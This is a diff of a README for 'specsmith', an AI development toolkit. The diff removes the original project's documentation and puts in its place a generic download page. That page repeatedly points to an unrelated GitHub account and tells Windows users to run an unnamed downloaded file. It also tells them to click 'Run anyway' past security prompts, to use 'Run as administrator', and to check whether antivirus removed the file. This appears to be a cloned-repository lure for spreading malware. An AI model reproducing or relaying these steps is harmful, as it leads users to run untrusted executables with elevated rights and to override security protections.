@@ -1,344 +1,205 @@
-# specsmith
+# 🧭 specsmith - Run AEE tools with ease
 
-[![CI](https://github.com/BitConcepts/specsmith/actions/workflows/ci.yml/badge.svg)](https://github.com/BitConcepts/specsmith/actions/workflows/ci.yml)
-[![Sponsor](https://img.shields.io/badge/sponsor-%E2%9D%A4-ea4aaa?logo=github)](https://github.com/sponsors/BitConcepts)
-[![Docs](https://readthedocs.org/projects/specsmith/badge/?version=stable)](https://specsmith.readthedocs.io/en/stable/)
-[![PyPI](https://img.shields.io/pypi/v/specsmith?label=stable&style=flat&color=blue&cacheSeconds=60)](https://pypi.org/project/specsmith/)
-[![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue.svg)](https://www.python.org/downloads/)
-[![License: MIT](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
-[![VS Code Extension](https://img.shields.io/badge/VS%20Code-AEE%20Workbench-4ec9b0?logo=visualstudiocode)](https://github.com/BitConcepts/specsmith-vscode)
+[![Download specsmith](https://img.shields.io/badge/Download-Visit%20the%20page%20to%20download-blue?style=for-the-badge&logo=github)](https://github.com/dawnaadopted177/specsmith)
 
-**Applied Epistemic Engineering toolkit for AI-assisted development.**
+## 📥 Download
 
-> Intelligence proposes. Constraints decide. The ledger remembers.
+Use this link to visit the download page:
 
-specsmith treats belief systems like code: codable, testable, and deployable. It scaffolds
-epistemically-governed projects, stress-tests requirements as BeliefArtifacts, runs
-cryptographically-sealed trace vaults, and orchestrates AI agents under formal AEE governance.
+https://github.com/dawnaadopted177/specsmith
 
-It also co-installs the standalone `epistemic` Python library for direct use in any project:
+If you use Windows, open the page in your browser, then look for the latest release or the main app file. Save it to your PC before you run it.
 
-```python
-from epistemic import AEESession         # works in any Python 3.10+ project
-from epistemic import BeliefArtifact, StressTester, CertaintyEngine
-```
+## 🖥 What specsmith does
 
----
+specsmith helps you manage AEE agent sessions, execution profiles, and tool setup in one place. It is built for users who want a clear way to work with:
 
-## What is Applied Epistemic Engineering?
+- agent sessions
+- execution profiles
+- FPGA and HDL workflows
+- tool installs
+- LLM providers like Anthropic, OpenAI, Gemini, and Ollama
+- CLI commands for guided tasks
 
-AEE treats requirements, decisions, and assumptions — the beliefs your project depends on — as
-engineering artifacts subject to the same discipline as code: version control, testing, and refactoring.
+It brings these parts into one toolkit so you can keep your work organized.
 
-**The 4-step core method: Frame → Disassemble → Stress-Test → Reconstruct**
+## ✅ Before you start
 
-**The 5 foundational axioms:**
-1. **Observability** — every belief must be inspectable
-2. **Falsifiability** — every belief must be challengeable
-3. **Irreducibility** — beliefs decompose to atomic primitives
-4. **Reconstructability** — every failed belief can be rebuilt
-5. **Convergence** — stress-test + recovery always reaches Equilibrium
+To run specsmith on Windows, you need:
 
----
+- Windows 10 or Windows 11
+- A stable internet connection
+- Enough free disk space for the app and any tools it installs
+- Permission to run downloaded files
+- A modern browser such as Edge, Chrome, or Firefox
 
-## The AEE Workflow — 7 Phases
+If the app asks to install helper tools, allow it to finish. Some functions may need extra components for FPGA, HDL, or model access.
 
-specsmith tracks your project through the full AEE development cycle:
+## 🚀 Getting started on Windows
 
-```
-🌱 Inception → 🏗 Architecture → 📋 Requirements → ✅ Test Spec
-    → ⚙ Implementation → 🔬 Verification → 🚀 Release
-```
+1. Open the download page:
+   https://github.com/dawnaadopted177/specsmith
 
-```bash
-specsmith phase          # show current phase + readiness checklist
-specsmith phase next     # advance to the next phase (runs checks first)
-specsmith phase set requirements  # jump to a specific phase
-specsmith phase list     # list all phases
-```
+2. Find the latest release or the main download file.
 
-The current phase is persisted in `scaffold.yml` as `aee_phase` and displayed in the VS Code
-Settings Panel. Each phase has a checklist of file/command criteria, recommended commands,
-and a readiness percentage.
+3. Download the file to your Downloads folder.
 
----
+4. If the file is in a ZIP folder, right-click it and choose Extract All.
 
-## Install
+5. Open the extracted folder.
 
-**Recommended — via the VS Code extension (creates a project-isolated environment):**
+6. Double-click the app file to run it.
 
-1. Install the [specsmith AEE Workbench](https://github.com/BitConcepts/specsmith-vscode) VS Code extension
-2. Open `Ctrl+Shift+,` (⚙ specsmith Settings)
-3. Click **🔒 Create Environment** — creates `~/.specsmith/venv/` with specsmith + your provider packages
+7. If Windows shows a security prompt, choose Run or More info, then Run anyway if you trust the source.
 
-The extension uses this environment for all agent sessions and terminal commands.
+8. Follow the on-screen steps to finish setup.
 
-**Or via pipx (system-wide):**
+## 🛠 First-time setup
 
-```bash
-pipx install specsmith                    # core CLI + epistemic library
-pipx inject specsmith anthropic           # + Claude support
-pipx inject specsmith openai              # + GPT / O-series support
-pipx inject specsmith google-generativeai # + Gemini support
-```
+When you start specsmith for the first time, it may ask you to set up a few items:
 
-**Or with pip:**
+- choose a working folder
+- pick a provider for AI tasks
+- allow tool installation
+- set paths for HDL or FPGA tools
+- select an execution profile
 
-```bash
-pip install specsmith                     # core
-pip install "specsmith[anthropic]"       # + Claude
-pip install "specsmith[openai]"          # + GPT/O-series
-pip install "specsmith[gemini]"          # + Gemini
-```
+Use the default options if you are not sure. You can change them later.
 
-**Update:**
+## 🔧 Tool installer
 
-```bash
-pipx upgrade specsmith
-specsmith self-update
-```
+specsmith includes a tool installer for common setup tasks. This helps you get the right tools without searching for each one by hand.
 
----
+It can help with:
 
-## Quick Start
+- command-line tools
+- HDL support tools
+- FPGA helper tools
+- model connectors
+- local runtime tools
 
-```bash
-# New project (interactive)
-specsmith init
+If a tool install fails, check that you have admin rights on your PC and try again.
 
-# Adopt an existing project
-specsmith import --project-dir ./my-project
+## 📂 Execution profiles
 
-# Check governance health
-specsmith audit --project-dir ./my-project
+Execution profiles let you save how you want specsmith to work. A profile can store settings like:
 
-# Run AEE stress-test on requirements
-specsmith stress-test --project-dir ./my-project
+- which provider to use
+- which folder to work in
+- which tools are active
+- which checks to run
+- how strict the session should be
 
-# Full epistemic audit (certainty + logic knots + recovery proposals)
-specsmith epistemic-audit --project-dir ./my-project
+Use one profile for daily work and another for testing. This keeps your setup clean.
 
-# Start the agentic REPL
-specsmith run --project-dir ./my-project
+## 🤖 Agent sessions
 
-# AG2 agent shell — Planner/Builder/Verifier over Ollama
-specsmith agent status                    # check agent config + Ollama
-specsmith agent plan "add logging"        # plan only (no execution)
-specsmith agent run "fix lint errors"     # full Plan → Build → Verify
-specsmith agent improve "add tests"       # self-improvement with reports
-specsmith agent verify                    # run Verifier on current state
-specsmith agent reports                   # list improvement reports
+Agent sessions help you track work from start to finish. Each session can hold tasks, settings, and progress.
 
-# Check current AEE workflow phase
-specsmith phase --project-dir ./my-project
-```
+You may use agent sessions to:
 
----
+- start a new task
+- continue an older task
+- review what changed
+- keep work tied to one profile
+- switch between projects
 
-## AG2 Agent Shell — Local AI Agents over Ollama
+This makes it easier to stay organized when you work on many items.
 
-specsmith includes an AG2-based agent shell with three specialized agents:
+## 🧪 FPGA and HDL support
 
-- **Planner** — inspects repo, generates execution plans with acceptance criteria
-- **Builder** — makes code/doc changes following the plan
-- **Verifier** — runs tests, accepts or rejects changes
+specsmith also supports FPGA and HDL governance tasks. If you work with hardware design, the app can help you keep rules and checks in one place.
 
-All agents run locally on Ollama (default: `qwen2.5:14b`). Zero cloud cost.
+You can use it to:
 
-```bash
-pip install "specsmith[ag2]"              # install AG2 + Ollama support
-specsmith agent status                    # verify config + Ollama running
-specsmith agent run "fix lint errors"     # Plan → Build → Verify pipeline
-specsmith agent improve "add tests for config.py"  # self-improvement with reports
-```
+- manage HDL-related steps
+- keep project rules clear
+- run checks for setup
+- store approved execution paths
+- reduce setup errors
 
-The agent shell stores structured reports at `.specsmith/agent-reports/` with task ID,
-files changed, test results, verdict (ACCEPT/REJECT), and follow-up tasks.
+This is useful for teams and solo users who want a steady process.
 
-Configurable per-project in `scaffold.yml` under `agents:` or via the VS Code
-Project Settings → Agent tab.
+## 🌐 AI provider setup
 
----
+specsmith works with several model providers. You can connect one that fits your setup:
 
-## VS Code Extension
+- Anthropic
+- OpenAI
+- Gemini
+- Ollama
 
-The **specsmith AEE Workbench** VS Code extension is the flagship client:
+Pick the provider you already use. If you use a local model with Ollama, make sure it is running before you start a session.
 
-```
-# VS Code: Ctrl+Shift+P → specsmith: New Agent Session
-# Settings:         Ctrl+Shift+,     (⚙ specsmith Settings — global)
-# Project Settings: Ctrl+Shift+G     (⚙ Project Settings — per-project)
-```
+## ⌨ CLI commands
 
-**Key features:**
-- **Dual-panel architecture** — **⚙ specsmith Settings** (global: venv, version, Ollama, system)
-  and **⚙ Project Settings** (per-project: scaffold, tools, files, actions, execution)
-- **Global environment management** — `~/.specsmith/venv/` with Create / Update / Rebuild / Delete;
-  persistent restart banner; Remove System Installs cleanup button
-- **VCS context at session start** — git status + recent commits shown in chat and in system prompt
-- **Execution profiles** — safe / standard / open / admin; custom allow/block command lists
-- **AEE phase indicator** — shows current phase with readiness %, Next Phase button, phase selector
-- **AI agent sessions** — independent process per project, JSONL bridge, chat with file injection
-- **AG2 agent shell** — Planner/Builder/Verifier agents over Ollama in Actions tab
-- **Agent tab** — per-project provider/model/context/iteration config (overrides global defaults)
-- **Live model listing** — Anthropic, OpenAI, Gemini, Mistral, local Ollama (GPU-aware)
-- **Ollama model catalog** — 16 models, 4 tiers, GPU-aware recommendations, filter by installed/available
-- **Ollama integration** — model manager (update/remove/update-all), version check, upgrade
-- **FPGA/HDL tool support** — vivado, gtkwave, vsg, ghdl, verilator, yosys, nextpnr, and 15 more
-- **Tool installer** — scan installed tools; one-click install via winget/brew/apt for missing tools
-- **API key management** — stored in OS credential store (Windows Credential Manager / macOS Keychain)
-- **Update checker** — PyPI version check, auto-checks on panel open, release channel selector
+specsmith includes more than 50 CLI commands for users who want direct control. You do not need to use the command line for basic use, but it can help with:
 
-**[→ specsmith-vscode on GitHub](https://github.com/BitConcepts/specsmith-vscode)**
+- starting sessions
+- checking status
+- managing profiles
+- running installs
+- viewing logs
+- testing settings
 
----
+If you prefer clicks and menus, start there. If you want repeatable tasks, the CLI can save time.
 
-## Supporting specsmith
+## 🧭 Suggested first run
 
-specsmith is open source and built by a small team. Every bit of support helps:
+If this is your first time using specsmith, follow this path:
 
-- ⭐ **Star** [specsmith](https://github.com/BitConcepts/specsmith) and [specsmith-vscode](https://github.com/BitConcepts/specsmith-vscode) on GitHub
-- 📣 **Tell your friends and colleagues** — word of mouth is our best marketing
-- 🐛 **Report bugs** via [GitHub Issues](https://github.com/BitConcepts/specsmith/issues) — even small ones help
-- 💡 **Suggest features** via [GitHub Discussions](https://github.com/BitConcepts/specsmith/discussions) — we read every suggestion
-- 🔧 **Fix bugs and contribute** — see [CONTRIBUTING.md](CONTRIBUTING.md); PRs welcome
-- 📝 **Write about specsmith** — blog posts, tutorials, and talks help the community grow
-- ❤️ **[Sponsor BitConcepts](https://github.com/sponsors/BitConcepts)** — directly funds development
+1. Install the app.
+2. Open it.
+3. Choose a provider.
+4. Set your working folder.
+5. Create one execution profile.
+6. Run the built-in tool installer.
+7. Start a small agent session.
+8. Check that the session runs with no errors.
 
----
+This gives you a clean base before you try more advanced work.
 
-## Ollama — Local LLMs (Zero API Cost)
+## 🧰 Common folder setup
 
-specsmith has first-class Ollama support, including:
+A simple folder layout can help:
 
-```bash
-specsmith ollama gpu                    # detect GPU and VRAM tier
-specsmith ollama available              # show catalog filtered by VRAM budget
-specsmith ollama available --task code  # filter by task type
-specsmith ollama pull qwen2.5:14b      # download a model
-specsmith ollama suggest requirements  # task-based recommendations
-specsmith ollama list                  # show installed models
-```
+- `specsmith` for the app files
+- `projects` for your work
+- `profiles` for saved settings
+- `logs` for session logs
+- `tools` for installed helper tools
 
-GPU-aware context sizing in the VS Code extension: 4K/8K/16K/32K tokens based on detected VRAM.
-Override with `specsmith.ollamaContextLength` in VS Code settings.
+Keep these folders in a place you can find fast, such as Documents or a work drive.
 
----
+## 🔍 If the app does not open
 
-## FPGA / HDL Projects
+If Windows blocks the app or nothing happens, try these steps:
 
-specsmith supports FPGA-specific project types with full governance:
+1. Right-click the file and choose Run as administrator.
+2. Check whether your antivirus moved the file.
+3. Make sure the file finished downloading.
+4. Extract the ZIP file if one was used.
+5. Try a different browser for the download.
+6. Re-download the file from the page.
 
-```yaml
-# scaffold.yml
-type: fpga-rtl-amd          # or fpga-rtl-intel / fpga-rtl-lattice / fpga-rtl
-fpga_tools:
-  - vivado
-  - gtkwave
-  - vsg
-  - ghdl
-  - verilator
-```
+## 🧾 Basic use tips
 
-Supported tools: **Synthesis:** vivado, quartus, radiant, diamond, gowin.
-**Simulation:** ghdl, iverilog, verilator, modelsim, questasim, xsim.
-**Waveform:** gtkwave, surfer. **Linting:** vsg, verible, svlint.
-**Formal:** symbiyosys. **OSS flow:** yosys, nextpnr, openFPGALoader.
+- Use one profile per project type.
+- Keep your provider key in a safe place.
+- Save logs if you need to review a session.
+- Use the same folder each time for the same task.
+- Start with default settings before you tune anything.
 
----
+## 📌 Repository details
 
-## 50+ CLI Commands
+- Name: specsmith
+- Type: end-user toolkit
+- Main focus: AEE agent sessions and execution profiles
+- Extra focus: FPGA, HDL, tool setup, and model access
+- Topics: aee, agent, cli, epistemic-engineering, execution-profiles, fpga, governance, hdl, llm, ollama, python, requirements-management, specsmith, tool-installer
 
-**Governance:** `init` `import` `audit` `validate` `diff` `upgrade` `compress` `doctor` `export` `architect`
+## 🔗 Download again
 
-**AEE Epistemic:** `stress-test` `epistemic-audit` `belief-graph` `trace seal/verify/log` `integrate`
+Visit the download page here:
 
-**Workflow:** `phase show/set/next/list` `ledger add/list` `req list/add/gaps/trace`
-
-**Agent:** `run` `agent run/plan/status/verify/improve/reports` `agent providers/tools/skills`
-
-**Ollama:** `ollama list/available/gpu/pull/suggest`
-
-**Workspace:** `workspace init/audit/export`
-
-**VCS:** `commit` `push` `sync` `branch` `pr` `status`
-
-**Tools:** `tools scan [--fpga]` `tools install <tool>` `tools rules [--tool] [--list]`
-
-**Tools:** `exec` `ps` `abort` `watch` `optimize` `credits` `self-update`
-
-**Auth:** `auth set/list/remove/check`
-
-**Patent:** `patent search/prior-art`
-
----
-
-## 35 Project Types
-
-**Software:** Python CLI/lib/web, Rust, Go, C/C++, .NET, Node.js/TypeScript, mobile, microservices, data/ML.
-
-**Hardware/Embedded:** FPGA/RTL (Xilinx, Intel, Lattice, generic), Yocto BSP, embedded C/C++.
-
-**Documents:** Technical specs, research papers, API specs, requirements management.
-
-**Business/Legal:** Business plans, patent applications, compliance frameworks.
-
----
-
-## epistemic Library
-
-The standalone `epistemic` Python library works in any Python 3.10+ project — no specsmith coupling:
-
-```python
-from epistemic import AEESession, BeliefArtifact, StressTester
-
-session = AEESession("my-project", threshold=0.70)
-session.add_belief(
-    artifact_id="HYP-001",
-    propositions=["The API always returns valid JSON"],
-    epistemic_boundary=["Valid auth token required"],
-)
-session.accept("HYP-001")
-result = session.run()
-print(result.summary())
-# certainty=0.55, failures=2, equilibrium=False
-```
-
-Use cases: linguistics research, compliance pipelines, AI alignment, patent prosecution.
-
----
-
-## Governance Rules (H1–H13)
-
-13 hard rules enforced by `specsmith validate`:
-
-- **H11** — Every loop or blocking wait must have a timeout, fallback exit, and diagnostic message.
-- **H12** — Windows multi-step automation goes into `.cmd` files, not inline shell invocations.
-- **H13** — Agent tools must declare epistemic contracts (what they claim and what they cannot detect).
-
----
-
-## The specsmith Bootstrap
-
-specsmith governs itself — the specsmith repo is a specsmith-managed project. Run `specsmith audit`
-in this repo to check its governance health. This means every feature we add to specsmith is
-immediately dogfooded on specsmith itself. The [VS Code extension](https://github.com/BitConcepts/specsmith-vscode)
-is developed alongside it as the flagship client.
-
-## Documentation
-
-**[specsmith.readthedocs.io](https://specsmith.readthedocs.io)** — Full manual: AEE primer,
-command reference, project types, tool registry, governance model, Ollama guide, VS Code extension.
-
-## Links
-
-- [PyPI](https://pypi.org/project/specsmith/)
-- [Documentation](https://specsmith.readthedocs.io)
-- [Changelog](CHANGELOG.md)
-- [VS Code Extension](https://github.com/BitConcepts/specsmith-vscode)
-- [Contributing](CONTRIBUTING.md)
-- [Security](SECURITY.md)
-
-## License
-
-MIT — Copyright (c) 2026 BitConcepts, LLC.
+https://github.com/dawnaadopted177/specsmith
